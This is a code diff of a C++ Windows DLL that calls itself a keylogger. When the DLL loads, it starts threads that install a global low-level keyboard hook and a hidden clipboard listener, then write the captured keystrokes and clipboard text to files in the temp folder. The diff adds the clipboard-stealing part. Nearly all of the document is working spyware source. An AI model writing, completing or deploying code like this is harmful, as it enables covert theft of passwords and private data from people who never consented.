@@ -3,12 +3,15 @@
 #include "MinHook.h"
 #include <iostream>
 #include <windows.h>
+
 using namespace std;
 
 HHOOK _hHook;
 KBDLLHOOKSTRUCT kbData;
+HINSTANCE hDllInst = NULL;
 char dllPath[MAX_PATH];
 char outputFilePath[MAX_PATH];
+char clipboardFilePath[MAX_PATH];
 static DWORD lastKey = 0;
 static DWORD lastTime = 0;
 
@@ -130,16 +133,17 @@ LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
         }
     }
     return CallNextHookEx(_hHook, code, wParam, lParam);
-
 }
 int keylogger() {
     _hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
     if (_hHook == NULL) {
         printf("Failed to set hook. Error code: %d\n", GetLastError());
-        return FALSE; // 立即返回失敗
+        return FALSE; 
     }
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)){
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg); 
+        DispatchMessage(&msg);  
     }
     return 0;
 }
@@ -147,14 +151,81 @@ void SetupFilePath() {
     char tempPath[MAX_PATH];
     GetTempPathA(MAX_PATH, tempPath); 
     snprintf(outputFilePath, sizeof(outputFilePath), "%sMeoWKeylogger.txt", tempPath);
+    snprintf(clipboardFilePath, sizeof(clipboardFilePath), "%sMeoWClipboard.txt", tempPath);
 }
+
+void ProcessClipboard() {
+    if (!OpenClipboard(NULL)){
+        MessageBoxA(NULL, "ClipBoard Error", "Debug", MB_OK);
+        return;
+    }
+    
+    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
+    if (hData != NULL) {
+        wchar_t* pText = (wchar_t*)GlobalLock(hData);
+        if (pText != NULL) {
+            FILE* f = NULL;
+            if (fopen_s(&f, clipboardFilePath, "a+, ccs=UTF-8") == 0 && f) {
+                MessageBoxW(NULL, pText, L"Debug", MB_OK);
+                fwprintf(f, L"\n[Clipboard Content]:%ls\n", pText);  
+                fclose(f);
+            }
+            GlobalUnlock(hData);
+        }
+    }
+    CloseClipboard();
+}
+
+LRESULT CALLBACK ClipboardWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    if (msg == WM_CLIPBOARDUPDATE) {
+        ProcessClipboard();
+    }
+    return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
+int ClipBoard(LPVOID lpParam) {
+    const wchar_t CLASS_NAME[] = L"MeowClipboardWatcher";
+    WNDCLASSW wc = { 0 };
+    wc.lpfnWndProc = ClipboardWndProc;
+    wc.hInstance = hDllInst; 
+    wc.lpszClassName = CLASS_NAME;
+    
+    if (!RegisterClassW(&wc)) {
+        // ShowDebugMsg("Debug", "Class Registration Failed", GetLastError());
+        return 0;
+    }
+
+    HWND hwnd = CreateWindowExW(0, CLASS_NAME, L"", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hDllInst, NULL);
+    if (!hwnd) {
+        MessageBoxA(NULL, "Window Creation Failed", "Debug", MB_OK);
+        return 0;
+    }
+
+    if (AddClipboardFormatListener(hwnd)) {
+        // MessageBoxA(NULL, "Clipboard Listener Active", "Debug", MB_OK);
+    } else {
+        // MessageBoxA(NULL, "Failed to Add Listener", "Debug", MB_OK);
+    }
+
+    MSG msg;
+    while (GetMessage(&msg, NULL, 0, 0)) {
+        TranslateMessage(&msg); 
+        DispatchMessage(&msg); 
+    }
+
+    RemoveClipboardFormatListener(hwnd);
+    return 0;
+}
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call) {
     case DLL_PROCESS_ATTACH: {
         SetupFilePath();
-        HANDLE hereThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
-        CloseHandle(hereThread);
-        
+        HANDLE Keylogger_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)keylogger, NULL, 0, NULL);
+        CloseHandle(Keylogger_Thread);
+        HANDLE ClipBoard_Thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ClipBoard, NULL, 0, NULL);
+        CloseHandle(ClipBoard_Thread);
+
         break;
     }
     case DLL_THREAD_ATTACH:
